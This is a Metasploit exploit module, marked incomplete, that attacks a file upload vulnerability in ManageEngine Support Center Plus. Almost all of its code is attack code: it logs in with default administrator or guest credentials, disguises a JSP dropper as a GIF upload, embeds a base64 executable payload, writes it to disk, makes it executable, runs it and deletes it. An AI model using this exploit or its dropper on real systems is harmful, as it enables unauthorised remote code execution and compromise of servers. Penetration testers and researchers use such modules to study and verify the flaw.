##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE

  def initialize(info={})
    super(update_info(info,
      'Name'           => "[INCOMPLETE] ManageEngine Support Center Plus File Upload Vulnerability",
      'Description'    => %q{
          This module exploits a file upload vulnerability found in ManageEngine Support
        Center Plus.  It is possible to bypass the file extension verification check, and
        then upload an arbitrary file on to the service.  A valid login is required in oder
        to exploit the upload feature, however, there are default credentials that can be
        abused.  For example, the default installer comes with 'administrator:administrator'
        for administrative access; or 'guest:guest' for guest access.

          This module currently is incomplete, and can only successfully upload an
        arbitrary file onto the remote machine.  Only tested on Windows.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'xistence',  # Original
          'sinn3r'     # Metasploit
        ],
      'References'     =>
        [
          ['OSVDB', '86598'],
          ['EDB', '22040']
        ],
      'Platform'       => ['linux', 'win'],
      'Targets'        =>
        [
          [ 'Winodws', { 'Arch' => ARCH_X86, 'Platform' => 'win' }  ],
          [ 'Linux'  , { 'Arch' => ARCH_X86, 'Platform' => 'linux'} ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Oct 17 2012"
    ))

    register_options(
      [
        OptPort.new('RPORT',       [true, 'The target port', 8080]),
        OptString.new('TARGETURI', [true, 'The base directory to the application', '/']),
        OptString.new('USERNAME',  [true, 'The username to login with', 'administrator']),
        OptString.new('PASSWORD',  [true, 'The password to login with', 'administrator'])
      ], self.class)
  end

  def base
    base = target_uri.path
    base << '/' if base[-1,1] != '/'
    return base
  end

  def peer
    "#{rhost}:#{rport}"
  end

  def check
    res = send_request_raw({'uri'=>base})
    if res and res.body =~ /\<title\>ManageEngine SupportCenter Plus\<\/title\>/
      return Exploit::CheckCode::Detected
    else
      return Exploit::CheckCode::Safe
    end
  end

  def login(user, pass)
    #
    # Get the session ID
    #
    res = send_request_raw({'uri'=>base})
    if res and res.headers['Set-Cookie'] =~ /(JSESSIONID=\w+)\;/
      session_id = $1
      vprint_status("#{peer} - #{session_id}")
    else
      return ''
    end

    #
    # Now login and get the cookie
    #
    send_request_cgi({
      'method'    => 'POST',
      'uri'       => "#{base}j_security_check;#{session_id}",
      'cookie'    => "#{session_id}; PREV_CONTEXT_PATH=",
      'headers'   => {
        'Origin'  => "http://#{peer}",
        'Referer' => "http://#{peer}/"
      },
      'vars_post' => {
        'j_username'      => user,
        'j_password'      => pass,
        'logonDomainName' => 'undefined',
        'sso_status'      => 'false',
        'loginButton'     => 'Login'
      }
    })

    #
    # Check if login was successful
    #
    res = send_request_raw(
      {
        'uri'    => "#{base}HomePage.do",
        'cookie' => session_id
      })
    if res and res.body =~ /\<a href\=\"javascript\:preLogout\(\)\"\>Log out\<\/a\>/
      return session_id
    end

    return ''
  end

  def generate_jsp_payload
    opts                = {:arch => target.arch, :platform => target.platform}
    native_payload      = Rex::Text.encode_base64(generate_payload_exe(opts))
    native_payload_name = Rex::Text.rand_text_alpha(rand(6)+3)
    ext                 = (target['Platform'] == 'win') ? '.exe' : '.bin'

    var_raw     = Rex::Text.rand_text_alpha(rand(8) + 3)
    var_ostream = Rex::Text.rand_text_alpha(rand(8) + 3)
    var_buf     = Rex::Text.rand_text_alpha(rand(8) + 3)
    var_decoder = Rex::Text.rand_text_alpha(rand(8) + 3)
    var_tmp     = Rex::Text.rand_text_alpha(rand(8) + 3)
    var_path    = Rex::Text.rand_text_alpha(rand(8) + 3)
    var_proc2   = Rex::Text.rand_text_alpha(rand(8) + 3)

    if target['Platform'] == 'linux'
      var_proc1 = Rex::Text.rand_text_alpha(rand(8) + 3)
      chmod = %Q|
      Process #{var_proc1} = Runtime.getRuntime().exec("chmod 777 " + #{var_path});
      Thread.sleep(200);
      |

      var_proc3 = Rex::Text.rand_text_alpha(rand(8) + 3)
      cleanup = %Q|
      Thread.sleep(200);
      Process #{var_proc3} = Runtime.getRuntime().exec("rm " + #{var_path});
      |
    else
      chmod   = ''
      cleanup = ''
    end

    jsp = %Q|
    <%@page import="java.io.*"%>
    <%@page import="sun.misc.BASE64Decoder"%>

    <%
    byte[] #{var_raw} = null;
    BufferedOutputStream #{var_ostream} = null;
    try {
      String #{var_buf} = "#{native_payload}";

      BASE64Decoder #{var_decoder} = new BASE64Decoder();
      #{var_raw} = #{var_decoder}.decodeBuffer(#{var_buf}.toString());

      File #{var_tmp} = File.createTempFile("#{native_payload_name}", "#{ext}");
      String #{var_path} = #{var_tmp}.getAbsolutePath();

      #{var_ostream} = new BufferedOutputStream(new FileOutputStream(#{var_path}));
      #{var_ostream}.write(#{var_raw});
      #{var_ostream}.close();
      #{chmod}
      Process #{var_proc2} = Runtime.getRuntime().exec(#{var_path});
      #{cleanup}
    } catch (Exception e) {
    }
    %>
    |

    jsp = jsp.gsub(/\n/, '')
    jsp = jsp.gsub(/\t/, '')

    return jsp
  end

  def upload_exec(sid, fname, p)
    #
    # Upload the payload to the vulnerable host
    #
    data = Rex::MIME::Message.new
    data.add_part(p, 'image/gif', nil, "form-data; name=\"img_file\"; filename=\"#{fname}\"")

    post_data = data.to_s
    post_data = post_data.gsub(/^\r\n\-\-\_Part\_/, '--_Part_')

    print_status("#{peer} - Uploading '#{fname}'...")
    res = send_request_cgi({
      'method'   => 'POST',
      'uri'      => "#{base}jsp/UploadImage.jsp",
      'cookie'   => sid,
      'vars_get' => {'Module'=>'WorkOrder' },
      'ctype'    => "multipart/form-data; boundary=#{data.bound}",
      'data'     => post_data
    })

    if not res
      fail_with(Exploit::Failure::Unknown, "#{peer} - No response from host while uploading.")
    end

    #
    # Example of the pattern we want to capture:
    # .previewImage("/inline/"+"WorkOrder"+"/"+"3"+"/"+"1351619730601.jsp")
    # 
    pattern = /\.previewImage\(\"\/(.+)\/\"\+\"(.+)\"\+\"\/\"\+\"(.+)\"\+\"\/\"\+\"(.+)\"/
    fname = res.body.scan(pattern).flatten
    if fname.empty?
      fail_with(Exploit::Failure::Unknown, "#{peer} - Cannot locate the payload new file path")
    else
      fname = fname * '/'
    end

    #
    # Now try to execute the payload
    #
    print_status("#{peer} - Executing '#{fname}'")
    res = send_request_raw({
      'uri'    => "#{base}#{fname}",
      'cookie' => sid
    })

    ####################################################
    #     500 - Unable to compile class for JSP        #
    ####################################################
    print_status(res.message)

  end

  def exploit
    #
    # Login in order to obtain the cookie and session ID
    #
    user = datastore['USERNAME']
    pass = datastore['PASSWORD']
    sid = login(user, pass)
    if sid.empty?
      fail_with(Exploit::Failure::Unknown, "#{peer} - Cannot login with '#{user}:#{pass}'")
    else
      print_good("#{peer} - Logged in as '#{user}:#{pass}'")
    end

    #
    # Upload our payload and execute it
    #
    php_fname = "#{Rex::Text.rand_text_alpha(5)}.jsp"
    p         = generate_jsp_payload
    upload_exec(sid, php_fname, p)
  end
end
